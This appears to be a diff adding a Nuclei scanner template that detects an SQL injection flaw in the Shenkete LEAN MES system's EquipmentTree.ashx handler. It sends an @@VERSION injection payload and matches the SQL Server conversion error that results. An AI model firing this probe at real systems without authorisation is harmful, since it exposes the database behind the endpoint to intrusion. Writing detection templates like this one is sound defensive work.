@@ -1,0 +1,27 @@
+id: shenkete-LEAN-MES-EquipmentTree_ashx-sql
+
+info:
+  name: 深科特 LEAN MES系统 EquipmentTree.ashx SQL注入漏洞
+  author: shenkete
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        POST /Handler/EquipmentTree.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id=@@VERSION
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '在将 nvarchar 值'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 500
